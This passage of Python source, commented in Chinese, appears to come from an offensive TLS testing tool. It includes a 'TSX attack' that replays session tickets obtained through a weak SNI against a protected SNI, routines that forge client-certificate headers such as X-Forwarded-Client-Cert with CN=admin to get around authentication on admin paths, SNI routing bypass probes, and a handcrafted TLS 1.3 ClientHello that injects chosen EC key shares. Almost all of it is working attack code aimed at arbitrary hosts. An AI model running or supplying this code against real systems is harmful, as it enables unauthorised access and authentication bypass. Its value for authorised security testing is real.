                'evidence': f"Sandbox testing failed: {e}"
            }
    
    def _assess_wasm_usage(self, indicators: Dict) -> Dict:
        """评估Wasm使用情况"""
        
        wasm_score = 0
        detected_features = []
        security_implications = []
        attack_surface = []
        
        # 评分系统
        timing_analysis = indicators.get('response_timing_analysis', {})
        if timing_analysis.get('wasm_timing_detected', False):
            wasm_score += 3
            detected_features.append("Wasm compilation caching patterns detected")
        
        plugin_detection = indicators.get('plugin_detection', {})
        if plugin_detection.get('detected', False):
            wasm_score += 4
            detected_features.append("Wasm plugin indicators found")
            
        runtime_characteristics = indicators.get('runtime_characteristics', {})
        if runtime_characteristics.get('wasm_runtime_detected', False):
            wasm_score += 2
            detected_features.append("Wasm runtime characteristics identified")
        
        security_features = indicators.get('security_features', {})
        if security_features.get('sandbox_detected', False):
            wasm_score += 1
            detected_features.append("Wasm sandbox isolation detected")
        
        # 确定运行时类型和置信度
        if wasm_score >= 6:
            runtime_type = "Envoy_with_Wasm"
            confidence = 0.9
        elif wasm_score >= 3:
            runtime_type = "Likely_Wasm_Enabled"
            confidence = 0.6
        elif wasm_score >= 1:
            runtime_type = "Possible_Wasm_Features"
            confidence = 0.3
        else:
            runtime_type = "Traditional_Runtime"
            confidence = 0.1
        
        # 安全影响分析
        if wasm_score > 0:
            security_implications.extend([
                "Wasm runtime presents new attack surface",
                "Plugin-based architecture may have isolation vulnerabilities",
                "Wasm module loading could be targeted for code injection"
            ])
            
            attack_surface.extend([
                "Wasm module upload/injection vectors",
                "Plugin configuration manipulation",
                "Sandbox escape attempts",
                "Memory corruption in Wasm runtime"
            ])
        else:
            security_implications.append("Traditional architecture - focus on standard web server vulnerabilities")
            attack_surface.append("Standard nginx/web server attack vectors")
        
        return {
            'detected': wasm_score > 0,
            'confidence': confidence,
            'runtime_type': runtime_type,
            'score': wasm_score,
            'features': detected_features,
            'security_implications': security_implications,
            'attack_surface': attack_surface
        }
    
    async def _fallback_attack_strong_sni(self, strong_sni, session_ticket):
        """备用攻击方法 - 标准库ssl实现"""
        print(f"[!] Using fallback SSL attack for {strong_sni}")
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            sock = socket.create_connection((self.target_host, self.target_port), self.timeout)
            
            # 尝试会话恢复 - 标准库版本
            ssock = context.wrap_socket(
                sock, 
                server_hostname=strong_sni,
                session=session_ticket
            )
            
            resumed = ssock.session_reused if hasattr(ssock, 'session_reused') else False
            
            if resumed:
                print(f"[+] Fallback session resumed")
                ssock.close()
                return True, "Fallback session resume successful"
            else:
                ssock.close()
                return False, "Fallback session not resumed"
                
        except Exception as e:
            return False, f"Fallback attack failed: {e}"
    
    async def run_tsx_attack(self, weak_sni, strong_sni):
        """执行完整TSX攻击 - 工业级流水线版本"""
        print(f"[*] TSX Attack: {weak_sni} -> {strong_sni}")
        
        # 显示session池统计
        self.get_session_stats()
        
        # 步骤1：检查是否已有session可重用
        existing_session = self._load_session(weak_sni)
        if existing_session:
            print(f"[*] Found existing session for {weak_sni}, testing persistence...")
            persistence_results = await self.test_session_persistence(weak_sni, strong_sni)
            
            if persistence_results.get('summary', {}).get('successful_reuses', 0) > 0:
                print(f"[+] Session persistence confirmed - bypassing probe phase")
                return True, f"TSX bypass via persistent session: {persistence_results['summary']}"
        
        # 步骤2：从弱门获取新票据
        print(f"[*] Probing weak SNI for fresh session...")
        if not await self.probe_weak_sni(weak_sni):
            return False, "Failed to obtain session ticket"
        
        # 步骤3：攻击强门 - 使用session池机制
        print(f"[*] Attacking strong SNI with fresh session...")
        success, message = await self.attack_strong_sni(strong_sni, weak_sni)
        
        # 步骤4：如果成功，进行额外的持久性测试
        if success:
            print(f"[+] Initial TSX attack successful, testing session persistence...")
            persistence_results = await self.test_session_persistence(weak_sni, strong_sni)
            
            enhanced_message = f"TSX bypass successful: {message} | Persistence: {persistence_results.get('summary', {})}"
            return True, enhanced_message
        else:
            return False, f"TSX attack failed: {message}"

class mTLSTrustLeakage:
    """mTLS信任泄漏检测"""
    
    def __init__(self, target_host, target_port=443, timeout=5.0):
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.session_cache = {}  # 缓存会话信息
    
    async def test_header_injection(self, test_path="/"):
        """测试客户端证书头部注入（差分法，降噪版）"""
        # 测试头部列表
        test_headers = [
            ("X-Forwarded-Client-Cert", "-----BEGIN CERTIFICATE-----\nMIICdummy...\n-----END CERTIFICATE-----"),
            ("X-Client-Cert", "present"),
            ("SSL-Client-Verify", "SUCCESS"),
            ("ssl_client_s_dn", "CN=admin,O=TestOrg"),
            ("X-SSL-Client-CN", "admin"),
            ("X-Client-Certificate", "verified")
        ]
        
        results = []
        
        # 基线请求
        baseline = await self._make_request(test_path)
        
        for header_name, header_value in test_headers:
            try:
                injected = await self._make_request(test_path, extra_headers={header_name: header_value})
                evidence = self._detect_auth_bypass(baseline, injected, test_path, header_name)
                if evidence:
                    results.append({
                        'header': header_name,
                        'status': injected.get('status', 0),
                        'vulnerable': True,
                        'evidence': evidence
                    })
                else:
                    results.append({
                        'header': header_name,
                        'status': injected.get('status', 0),
                        'vulnerable': False,
                        'evidence': 'No differential effect observed'
                    })
            except Exception as e:
                results.append({
                    'header': header_name,
                    'status': 0,
                    'vulnerable': None,
                    'evidence': f"Error: {e}"
                })
        
        return results
    
    async def test_proxy_cert_bypass(self, target_paths=None):
        """HTTP代理证书穿透攻击 - 针对nginx/Apache代理配置错误"""
        
        if target_paths is None:
            target_paths = [
                "/", "/admin", "/api", "/management", "/internal", 
                "/config", "/status", "/health", "/metrics", "/debug"
            ]
        
        # 高级证书头部伪造
        cert_bypass_headers = [
            # nginx标准头部
            ("X-Forwarded-Client-Cert", self._generate_fake_client_cert()),
            ("X-SSL-Client-Subject", "CN=admin,O=Internal,OU=Management"),
            ("X-SSL-Client-Issuer", "CN=Corporate CA,O=TrustedOrg"),
            ("X-SSL-Client-Verify", "SUCCESS"),
            ("X-SSL-Client-S-DN", "CN=administrator,O=system"),
            ("X-SSL-Client-I-DN", "CN=Root CA,O=Internal"),
            
            # Apache/IIS变体
            ("SSL_CLIENT_S_DN", "CN=admin,O=Internal"),
            ("SSL_CLIENT_VERIFY", "SUCCESS"),
            ("HTTP_X_CLIENT_CERT", "VERIFIED"),
            ("X-Client-Certificate", "VALID"),
            
            # 边缘情况
            ("X-Forwarded-SSL-Client-Cert", "present"),
            ("X-Client-Certificate-Status", "verified"),
            ("SSL-Client-Cert", "OK")
        ]
        
        bypass_results = []
        
        # Soft time budget to avoid phase timeout
        # 预算自适应：占全局 timeout 的 30%，范围 [60, 240]
        global_timeout = float(getattr(self, 'timeout', 300.0) or 300.0)
        budget_seconds = min(max(global_timeout * 0.30, 60.0), 240.0)
        budget_deadline = time.perf_counter() + budget_seconds
        
        for path in target_paths:
            if time.perf_counter() > budget_deadline:
                logger.info("Cert bypass scanning stopped early due to soft budget (%.1fs)", budget_seconds)
                break
            print(f"[*] Testing cert bypass on: {path}")
            
            # 基线请求（无证书头部）
            baseline_response = await self._make_request(path)
            
            for header_name, header_value in cert_bypass_headers:
                if time.perf_counter() > budget_deadline:
                    break
                bypass_response = await self._make_request(
                    path, 
                    extra_headers={header_name: header_value}
                )
                
                # 检测绕过成功的信号
                bypass_detected = self._detect_auth_bypass(
                    baseline_response, bypass_response, path, header_name
                )
                
                if bypass_detected:
                    bypass_results.append({
                        'path': path,
                        'header': header_name,
                        'baseline_status': baseline_response.get('status', 0),
                        'bypass_status': bypass_response.get('status', 0),
                        'evidence': bypass_detected,
                        'critical': True
                    })
                    print(f"[+] BYPASS DETECTED: {path} via {header_name}")
                    print(f"    Evidence: {bypass_detected}")
                    print(f"    Baseline: {baseline_response.get('status', 0)} ({baseline_response.get('length', 0)} bytes)")
                    print(f"    Bypass: {bypass_response.get('status', 0)} ({bypass_response.get('length', 0)} bytes)")
                    # Early-stop once strong signal found for a path
                    break
        
        return bypass_results
    
    def _generate_fake_client_cert(self):
        """生成伪造的客户端证书PEM字符串"""
        return """-----BEGIN CERTIFICATE-----
MIICdTCCAV0CAQAwDQYJKoZIhvcNAQELBQAwEjEQMA4GA1UEAwwHVGVzdCBDQTAe
Fw0yNDAxMDEwMDAwMDBaFw0yNTEyMzEyMzU5NTlaMAAwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQC4f5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5
z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5z5
-----END CERTIFICATE-----"""
    
    async def _make_request(self, path, extra_headers=None):
        """发送HTTP请求并返回响应信息"""
        try:
            import ssl, asyncio

            headers = {
                'Host': self.target_host,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'close'
            }
            
            if extra_headers:
                headers.update(extra_headers)

            # 组装请求
            request = f"GET {path} HTTP/1.1\r\n" + \
                      "".join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n"

            # 建立异步连接
            if self.target_port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    proxy_open_connection(PROXY_URL, self.target_host, self.target_port, ssl_context=ctx, server_hostname=self.target_host) if PROXY_ENABLED and PROXY_AVAILABLE else asyncio.open_connection(self.target_host, self.target_port, ssl=ctx, server_hostname=self.target_host),
                    timeout=self.timeout
                )
            else:
                reader, writer = await asyncio.wait_for(
                    proxy_open_connection(PROXY_URL, self.target_host, self.target_port) if PROXY_ENABLED and PROXY_AVAILABLE else asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )

            # 发送请求
            writer.write(request.encode('latin-1'))
            await writer.drain()

            # 读取响应
            raw = await asyncio.wait_for(reader.read(-1), timeout=self.timeout)
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

            # 解析响应
            txt = raw.decode('latin-1', errors='ignore')
            head, body = (txt.split("\r\n\r\n", 1) + [""])[:2]
            lines = head.split("\r\n")
            status_line = lines[0] if lines else ""
            try:
                status = int(status_line.split(" ")[1])
            except Exception:
                status = -1  # 解析失败标记，避免与真实HTTP状态码混淆
            
            resp_headers = {}
            for line in lines[1:]:
                if ":" in line:
                    k, v = line.split(":", 1)
                    resp_headers[k.strip()] = v.strip()

            return {
                'status': status,
                'headers': resp_headers,
                'body': body[:2048],
                'length': len(body)
            }
            
        except Exception as e:
            return {
                'status': 0,
                'headers': {},
                'body': '',
                'length': 0,
                'error': str(e)
            }
    
    def _is_similar_text(self, a: str, b: str) -> bool:
        """简版相似度：长度近似 或 词集合相似"""
        if not a and not b:
            return True
        if not a or not b:
            return False
        la, lb = len(a), len(b)
        if min(la, lb) / max(la, lb) > 0.8:
            return True
        sa, sb = set(a.split()), set(b.split())
        inter = len(sa & sb); uni = len(sa | sb) or 1
        return (inter / uni) > 0.7

    def _is_significantly_different(self, base_body: str, pem_body: str, base_len: int, pem_len: int, pem_headers: dict) -> bool:
        """检测PEM头部是否造成显著差异"""
        if (pem_len - base_len) >= 512:
            return True
        if not self._is_similar_text(base_body, pem_body):
            return True
        h = {k.lower(): v for k,v in pem_headers.items()}
        if 'set-cookie' in h or 'location' in h:
            return True
        return False

    async def _test_cert_bypass_with_differential(self, path):
        """差分三件套证书绕过测试"""
        try:
            # 基线请求
            base = await self._make_request(path, extra_headers={})
            
            # 垃圾头测试
            garbage = await self._make_request(path, extra_headers={
                "X-Forwarded-Client-Cert": "-----BEGIN CERTIFICATE-----\nINVALID\n-----END CERTIFICATE-----"
            })
            
            # PEM头测试
            pem = await self._make_request(path, extra_headers={
                "X-Forwarded-Client-Cert": "-----BEGIN CERTIFICATE-----\nMIIB...FAKE...WELLFORMED...\n-----END CERTIFICATE-----"
            })

            # 任何 5xx → 未定，不算绕过
            if base['status'] >= 500 or garbage['status'] >= 500 or pem['status'] >= 500:
                return "INCONCLUSIVE_5XX"
            
            # 垃圾头应与基线同态
            elif (garbage['status'] != base['status']) or (not self._is_similar_text(base['body'], garbage['body'])):
                return "NO_BYPASS"
            
            # PEM 头需明显改善到 2xx/3xx 且内容显著不同
            elif 200 <= pem['status'] < 400 and self._is_significantly_different(base['body'], pem['body'], base['length'], pem['length'], pem['headers']):
                return "BYPASS"
            else:
                return "NO_BYPASS"
                
        except Exception:
            return "INCONCLUSIVE_ERROR"

    def _detect_auth_bypass(self, baseline, bypass, path, header):
        """检测认证绕过成功的信号（保持向后兼容）"""
        
        baseline_status = baseline.get('status', 0)
        bypass_status = bypass.get('status', 0)
        baseline_body = baseline.get('body', '')
        bypass_body = bypass.get('body', '')
        
        # 任何5xx都标记为未定
        if baseline_status >= 500 or bypass_status >= 500:
            return None
        
        # 1. 状态码变化检测（需结合内容证据，避免假阳性）
        baseline_len = baseline.get('length', 0)
        bypass_len = bypass.get('length', 0)
        major_status_improve = (baseline_status in [401, 403] and 200 <= bypass_status < 400)
        content_delta = abs(bypass_len - baseline_len) > 500
        # 后续还会检测 admin 关键字与鉴权头
        
        # 2. 管理界面特征检测
        admin_indicators = [
            'dashboard', 'admin', 'panel', 'management', 'config',
            'logout', 'settings', 'users', 'system', 'database'
        ]
        
        baseline_admin_count = sum(1 for indicator in admin_indicators 
                                 if indicator in baseline_body.lower())
        bypass_admin_count = sum(1 for indicator in admin_indicators 
                               if indicator in bypass_body.lower())
        
        if bypass_admin_count > baseline_admin_count + 2:
            return f"Admin content revealed: {bypass_admin_count} indicators"
        
        # 3. 认证相关头部变化
        bypass_headers = bypass.get('headers', {})
        auth_headers = ['set-cookie', 'authorization', 'www-authenticate']
        
        for auth_header in auth_headers:
            if auth_header in bypass_headers and auth_header not in baseline.get('headers', {}):
                return f"Auth header appeared: {auth_header}"
        
        # 4. 仅当状态码改善 且 内容显著变化 才作为弱证据
        if major_status_improve and content_delta:
            return f"Status+Content bypass: {baseline_status}->{bypass_status}, {baseline_len}->{bypass_len} bytes"
        
        # 5. 错误消息差异
        if 'nginx' in baseline_body and 'nginx' not in bypass_body:
            return "Error page bypassed"
        
        return None
    
    async def detect_proxy_behavior(self):
        """检测代理/负载均衡特征（多信号融合，稳健判定）"""
        try:
            indicators = []
            score = 0.0
            max_score = 0.0
            
            # 1) TLS 基线握手时序（两次）
            timings = []
            for name, to in [('normal', self.timeout), ('short', min(0.8, max(0.2, self.timeout/4)))]:
                start = time.perf_counter()
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    with socket.create_connection((self.target_host, self.target_port), timeout=to) as sock:
                        with context.wrap_socket(sock, server_hostname=self.target_host) as ssock:
                            _ = ssock.cipher()
                    elapsed = (time.perf_counter() - start) * 1000
                    timings.append(elapsed)
                except Exception as e:
                    indicators.append(f"TLS connect error({name}): {str(e)[:80]}")
            if len(timings) >= 2:
                var = abs(max(timings) - min(timings))
                # 过于稳定的时序（<8ms）加分
                max_score += 1
                if var < 8:
                    score += 1; indicators.append(f"Consistent TLS timing (Δ={var:.1f}ms)")
            
            # 2) SNI→证书指纹矩阵（不同 SNI 时证书差异）
            try:
                sni_set = [self.target_host, f"www.{self.target_host}", f"cdn.{self.target_host}"]
                fps = {}
                for sni in sni_set:
                    info = await CDNCertAnalyzer(self.target_host, self.target_host, None, self.timeout)._get_cert_chain_info(self.target_host, self.target_port, sni=sni)
                    fp = info.get('fingerprint')
                    if fp:
                        fps[sni] = fp
                unique = len(set(fps.values())) if fps else 0
                max_score += 2
                if unique > 1:
                    score += 2; indicators.append(f"Multiple certs across SNI ({unique})")
            except Exception as e:
                indicators.append(f"SNI fingerprint check failed: {str(e)[:80]}")
            
            # 3) 应用层头部/指纹（Via/X-Cache/Server）
            try:
                resp = await self._make_request('/')
                headers = {k.lower(): v for k,v in resp.get('headers', {}).items()}
                server = headers.get('server', '')
                via = headers.get('via', '')
                xcache = headers.get('x-cache', '')
                max_score += 2
                if via:
                    score += 2; indicators.append(f"Via header present: {via}")
                elif 'cloudflare' in server.lower() or 'akamai' in server.lower() or 'nginx' in server.lower() and 'cdn' in server.lower():
                    score += 1; indicators.append(f"Server header suggests proxy/CDN: {server}")
                if xcache:
                    score += 1; max_score += 1; indicators.append(f"X-Cache present: {xcache}")
            except Exception as e:
                indicators.append(f"HTTP header probe failed: {str(e)[:80]}")
            
            # 4) TLS 版本/套件一致性
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                with socket.create_connection((self.target_host, self.target_port), timeout=self.timeout) as sock:
                    with context.wrap_socket(sock, server_hostname=self.target_host) as ssock:
                        ver = ssock.version() or ''
                        ciph = (ssock.cipher() or [''])[0]
                max_score += 1
                if ver in ('TLSv1.3','TLSv1.2') and ciph:
                    # 常见代理终止呈现固定版本/套件
                    score += 0.5; indicators.append(f"Stable TLS profile: {ver}/{ciph}")
            except Exception:
                pass
            
            # 归一化置信度，阈值判定
            confidence = 0.0 if max_score == 0 else min(1.0, score / max(1.0, max_score))
            detected = confidence >= 0.5
            return {
                'proxy_detected': detected,
                'indicators': indicators,
                'confidence': round(confidence, 2)
            }
        except Exception as e:
            return {
                'proxy_detected': False,
                'indicators': [f"Detection failed: {e}"],
                'confidence': 0.0
            }
class CDNCertAnalyzer:
    """CDN证书链分析器 - 检测CDN前端与源站证书差异"""
    
    def __init__(self, target_host, cdn_host=None, origin_ip=None, timeout=5.0):
        self.target_host = target_host
        self.cdn_host = cdn_host or target_host
        self.origin_ip = origin_ip
        self.timeout = timeout
        
    async def analyze_cdn_cert_mismatch(self):
        """分析CDN前端与源站证书差异"""
        results = {
            'cdn_cert': None,
            'origin_cert': None,
            'mismatches': [],
            'vulnerabilities': []
        }
        
        try:
            # 获取CDN前端证书
            print(f"[*] Analyzing CDN frontend: {self.cdn_host}")
            cdn_cert_info = await self._get_cert_chain_info(self.cdn_host, 443)
            results['cdn_cert'] = cdn_cert_info
            
            # 获取源站证书（如果有源站IP）
            if self.origin_ip:
                print(f"[*] Analyzing origin server: {self.origin_ip}")
                origin_cert_info = await self._get_cert_chain_info(
                    self.origin_ip, 443, sni=self.target_host
                )
                results['origin_cert'] = origin_cert_info
                
                # 分析差异
                mismatches = self._compare_cert_chains(cdn_cert_info, origin_cert_info)
                results['mismatches'] = mismatches
                
                # 检测潜在漏洞
                vulnerabilities = self._detect_cert_vulnerabilities(cdn_cert_info, origin_cert_info)
                results['vulnerabilities'] = vulnerabilities
            
            return results
            
        except Exception as e:
            results['error'] = str(e)
            return results
    
    async def _get_cert_chain_info(self, host, port, sni=None):
        """获取证书链信息"""
        import ssl
        import socket
        
        try:
            # 创建SSL上下文
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # 连接并获取证书
            sock = socket.create_connection((host, port), timeout=self.timeout)
            ssock = context.wrap_socket(sock, server_hostname=sni or host)
            
            # 获取证书链
            cert_der = ssock.getpeercert(binary_form=True)
            cert_pem = ssock.getpeercert()
            
            ssock.close()
            
            # 解析证书信息
            cert_info = {
                'subject': cert_pem.get('subject', []),
                'issuer': cert_pem.get('issuer', []),
                'san': cert_pem.get('subjectAltName', []),
                'not_before': cert_pem.get('notBefore', ''),
                'not_after': cert_pem.get('notAfter', ''),
                'serial_number': cert_pem.get('serialNumber', ''),
                'version': cert_pem.get('version', 0),
                'signature_algorithm': cert_pem.get('signatureAlgorithm', ''),
                'fingerprint': self._calc_cert_fingerprint(cert_der)
            }
            
            return cert_info
            
        except Exception as e:
            return {'error': str(e)}
    
    def _calc_cert_fingerprint(self, cert_der):
        """计算证书指纹"""
        import hashlib
        return hashlib.sha256(cert_der).hexdigest()[:32]
    
    def _compare_cert_chains(self, cdn_cert, origin_cert):
        """比较CDN和源站证书链差异"""
        mismatches = []
        
        if not cdn_cert or not origin_cert:
            return mismatches
        
        # 1. 检查Subject差异
        cdn_subject = self._extract_subject_cn(cdn_cert.get('subject', []))
        origin_subject = self._extract_subject_cn(origin_cert.get('subject', []))
        
        if cdn_subject != origin_subject:
            mismatches.append({
                'type': 'subject_mismatch',
                'cdn_subject': cdn_subject,
                'origin_subject': origin_subject,
                'severity': 'medium'
            })
        
        # 2. 检查Issuer差异
        cdn_issuer = self._extract_issuer_org(cdn_cert.get('issuer', []))
        origin_issuer = self._extract_issuer_org(origin_cert.get('issuer', []))
        
        if cdn_issuer != origin_issuer:
            mismatches.append({
                'type': 'issuer_mismatch',
                'cdn_issuer': cdn_issuer,
                'origin_issuer': origin_issuer,
                'severity': 'high'
            })
        
        # 3. 检查SAN差异
        cdn_san = set(name[1] for name in cdn_cert.get('san', []) if name[0] == 'DNS')
        origin_san = set(name[1] for name in origin_cert.get('san', []) if name[0] == 'DNS')
        
        if cdn_san != origin_san:
            mismatches.append({
                'type': 'san_mismatch',
                'cdn_san': list(cdn_san),
                'origin_san': list(origin_san),
                'severity': 'medium'
            })
        
        # 4. 检查有效期差异
        if cdn_cert.get('not_after') != origin_cert.get('not_after'):
            mismatches.append({
                'type': 'validity_mismatch',
                'cdn_expiry': cdn_cert.get('not_after'),
                'origin_expiry': origin_cert.get('not_after'),
                'severity': 'low'
            })
        
        return mismatches
    
    def _extract_subject_cn(self, subject):
        """提取Subject CN"""
        for field in subject:
            for attr in field:
                if attr[0] == 'commonName':
                    return attr[1]
        return ''
    
    def _extract_issuer_org(self, issuer):
        """提取Issuer组织"""
        for field in issuer:
            for attr in field:
                if attr[0] == 'organizationName':
                    return attr[1]
        return ''
    
    def _detect_cert_vulnerabilities(self, cdn_cert, origin_cert):
        """检测证书配置漏洞"""
        vulnerabilities = []
        
        # 1. 通配符证书滥用
        cdn_san = cdn_cert.get('san', [])
        for name_type, name_value in cdn_san:
            if name_type == 'DNS' and '*' in name_value:
                vulnerabilities.append({
                    'type': 'wildcard_certificate',
                    'certificate': 'cdn',
                    'wildcard_domain': name_value,
                    'risk': 'subdomain_takeover',
                    'severity': 'medium'
                })
        
        # 2. 自签名证书检测（降噪：严格对比subject与issuer结构是否完全一致）
        if origin_cert:
            try:
                if origin_cert.get('subject') == origin_cert.get('issuer'):
                    vulnerabilities.append({
                        'type': 'self_signed_certificate',
                        'certificate': 'origin',
                        'risk': 'potential_mitm',
                        'severity': 'medium'
                    })
            except Exception:
                pass
        
        # 3. 弱签名算法检测
        for cert_type, cert_info in [('cdn', cdn_cert), ('origin', origin_cert)]:
            if cert_info and cert_info.get('signature_algorithm'):
                sig_algo = cert_info['signature_algorithm'].lower()
                if 'sha1' in sig_algo or 'md5' in sig_algo:
                    vulnerabilities.append({
                        'type': 'weak_signature_algorithm',
                        'certificate': cert_type,
                        'algorithm': cert_info['signature_algorithm'],
                        'risk': 'certificate_forgery',
                        'severity': 'medium'
                    })
        
        return vulnerabilities
    
    async def test_sni_routing_bypass(self):
        """测试SNI路由绕过"""
        test_results = []
        
        # 测试不同SNI值
        test_snis = [
            self.target_host,                    # 正常SNI
            f"admin.{self.target_host}",        # 管理子域
            f"internal.{self.target_host}",     # 内部子域
            f"api.{self.target_host}",          # API子域
            "",                                  # 空SNI
            "nonexistent.invalid",              # 无效SNI
            f"{self.target_host}.evil.com"      # 域名混淆
        ]
        
        for sni in test_snis:
            if self.origin_ip:
                try:
                    cert_info = await self._get_cert_chain_info(self.origin_ip, 443, sni=sni)
                    
                    test_results.append({
                        'sni': sni,
                        'cert_fingerprint': cert_info.get('fingerprint', ''),
                        'subject': self._extract_subject_cn(cert_info.get('subject', [])),
                        'status': 'success' if 'error' not in cert_info else 'failed'
                    })
                    
                except Exception as e:
                    test_results.append({
                        'sni': sni,
                        'status': 'error',
                        'error': str(e)
                    })
        
        # 分析结果，检测异常响应
        unique_certs = set()
        for result in test_results:
            if result['status'] == 'success':
                unique_certs.add(result['cert_fingerprint'])
        
        # 如果不同SNI返回不同证书，可能存在路由配置错误
        routing_issues = []
        if len(unique_certs) > 1:
            routing_issues.append({
                'type': 'sni_routing_inconsistency',
                'unique_certificates': len(unique_certs),
                'risk': 'access_control_bypass',
                'severity': 'medium'
            })
        
        return {
            'test_results': test_results,
            'routing_issues': routing_issues
        }

class BuiltinTLSKeyshareInjector:
    """Minimal TLS 1.3 ClientHello injector to test custom P-256 key_share acceptance.
    Sends a handcrafted ClientHello with a caller-supplied EC point for secp256r1 (0x0017).
    Returns (accepted: bool, evidence: str).
    Acceptance heuristic:
      - Non-HRR ServerHello received → likely accepted key_share
      - Immediate fatal Alert or HRR → rejected
      - TLS1.2 ServerHello or protocol mismatch → inconclusive
    """
    HRR_RANDOM = bytes.fromhex(
        'CF21AD74E59A6111BE1D8C021E65B891C2A211020A0D4D0E0000000000000000'
    )

    def try_tls_keyshare(self, host: str, port: int, x: int, y: int, timeout: float = 5.0) -> tuple[bool, str]:
        import os, struct, socket
        server_name = host.encode('idna')
        # EC point (uncompressed): 0x04 || X || Y (32 bytes each)
        x_bytes = x.to_bytes(32, 'big', signed=False)
        y_bytes = y.to_bytes(32, 'big', signed=False)
        ec_point = b'\x04' + x_bytes + y_bytes
        ch = self._build_client_hello(server_name, group=0x0017, keyshare=ec_point)
        try:
            with socket.create_connection((host, port), timeout=timeout) as s:
                s.sendall(ch)
                s.settimeout(timeout)
                # Read first TLS record
                hdr = self._recvall(s, 5)
                if not hdr or len(hdr) < 5:
                    return (False, 'No response')
                content_type = hdr[0]
                rec_len = struct.unpack('>H', hdr[3:5])[0]
                body = self._recvall(s, rec_len)
                if content_type == 0x15:  # Alert
                    return (False, f'Alert: {body.hex()[:40]}')
                if content_type != 0x16 or not body:
                    return (False, f'Unexpected record type: 0x{content_type:02x}')
                # Handshake message(s)
                # Parse first handshake msg
                if len(body) < 4:
                    return (False, 'Handshake too short')
                hs_type = body[0]
                hs_len = int.from_bytes(body[1:4], 'big')
                hs_body = body[4:4+hs_len]
                if hs_type != 2:  # not ServerHello
                    return (False, f'Unexpected handshake type: {hs_type}')
                if len(hs_body) < 38:
                    return (False, 'ServerHello too short')
                # legacy_version(2) + random(32)
                srv_random = hs_body[2:34]
                is_hrr = (srv_random == self.HRR_RANDOM)
                logger.debug("EC acceptance decision: HRR=%s", is_hrr)
                if is_hrr:
                    return (False, 'HelloRetryRequest (HRR)')
                # Parse extensions in ServerHello for selected key_share group
                try:
                    # hs_body layout:
                    # legacy_version(2) | random(32) | session_id len(1) | session_id | cipher(2) | compression(1) | exts_len(2) | exts
                    p = 0
                    p += 2 + 32
                    sid_len = hs_body[p]; p += 1
                    p += sid_len
                    p += 2  # cipher
                    p += 1  # compression
                    exts_len = struct.unpack('>H', hs_body[p:p+2])[0]; p += 2
                    exts = hs_body[p:p+exts_len]
                    ep = 0
                    selected_group = None
                    while ep + 4 <= len(exts):
                        etype = struct.unpack('>H', exts[ep:ep+2])[0]
                        elen = struct.unpack('>H', exts[ep+2:ep+4])[0]
                        ev = exts[ep+4:ep+4+elen]
                        if etype == 0x0033 and len(ev) >= 2:  # key_share
                            selected_group = struct.unpack('>H', ev[:2])[0]
                            break
                        ep += 4 + elen
                    # Read next TLS record to verify server proceeds with encrypted handshake (implies ECDH computed)
                    next_hdr = self._recvall(s, 5)
                    has_encrypted = False
                    if next_hdr and len(next_hdr) == 5:
                        ctype2 = next_hdr[0]
                        rlen2 = struct.unpack('>H', next_hdr[3:5])[0]
                        _ = self._recvall(s, rlen2)
                        has_encrypted = (ctype2 in (0x16, 0x17))
                    logger.debug("EC acceptance decision: selected_group=%s, encrypted_follow=%s", f"0x{selected_group:04x}" if selected_group is not None else None, has_encrypted)
                    # Accept only if selected_group=secp256r1 AND next record indicates encrypted handshake/application
                    if selected_group == 0x0017 and has_encrypted:
                        return (True, 'ServerHello (non-HRR), selected_group=secp256r1, encrypted handshake followed')
                    # Otherwise reject as inconclusive
                    return (False, 'No encrypted follow-up or wrong group')
                except Exception:
                    return (False, 'Parsing ServerHello failed')
        except Exception as e:
            return (False, f'Injector socket error: {type(e).__name__}: {e}')

    def _recvall(self, s, n):
        data = b''
        while len(data) < n:
            chunk = s.recv(n - len(data))
            if not chunk:
                break
            data += chunk
        return data

    def _u8(self, v):
        import struct
        return struct.pack('>B', v)
    def _u16(self, v):
        import struct
        return struct.pack('>H', v)
    def _u24(self, v):
        return v.to_bytes(3, 'big')

    def _build_client_hello(self, server_name: bytes, group: int, keyshare: bytes) -> bytes:
        import os, struct
        # legacy_version 0x0303 in record, ClientHello legacy_version 0x0303
        random = os.urandom(32)
        session_id = os.urandom(32)
        # Cipher suites: TLS 1.3 set + a TLS1.2 as fallback
        ciphers = [0x1301, 0x1302, 0x1303, 0xC02F]
        cipher_bytes = b''.join(self._u16(c) for c in ciphers)
        # compression_methods: null
        comp = b'\x01\x00'
        # Extensions
        exts = []
        # server_name (0x0000)
        sni_host = server_name
        sni_list = self._u16(1 + 2 + len(sni_host)) + b'\x00' + self._u16(len(sni_host)) + sni_host
        exts.append(self._u16(0x0000) + self._u16(len(sni_list)) + sni_list)
        # supported_versions (0x002b) list: 0304, 0303
        vers_list = self._u8(4) + self._u16(0x0304) + self._u16(0x0303)
        exts.append(self._u16(0x002b) + self._u16(len(vers_list)) + vers_list)
        # supported_groups (0x000a): secp256r1(0x0017), x25519(0x001d)
        groups = [0x0017, 0x001d]
        grp_list = self._u16(2*len(groups)) + b''.join(self._u16(g) for g in groups)
        exts.append(self._u16(0x000a) + self._u16(len(grp_list)) + grp_list)
        # signature_algorithms (0x000d)
